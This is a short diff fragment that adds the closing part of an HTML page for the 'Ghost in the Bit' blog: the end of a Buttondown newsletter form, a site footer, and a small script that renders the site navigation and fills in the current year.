+        <p>
+          <a href="https://buttondown.com/refer/ghostinthebit" target="_blank" rel="noopener">
+            Powered by Buttondown.
+          </a>
+        </p>
+      </form>
+    </div>
+  </main>
+
+  <footer class="site-footer">
+    <p><span id="footer-year"></span> · Ghost in the Bit</p>
+  </footer>
+  <script type="module">
+    import { renderSiteNav } from "/platform/lib/site-nav.js";
+    renderSiteNav(document.getElementById("site-nav-inline"), "blog");
+    document.getElementById("footer-year").textContent = new Date().getFullYear();
+  </script>
+</body>
+</html>
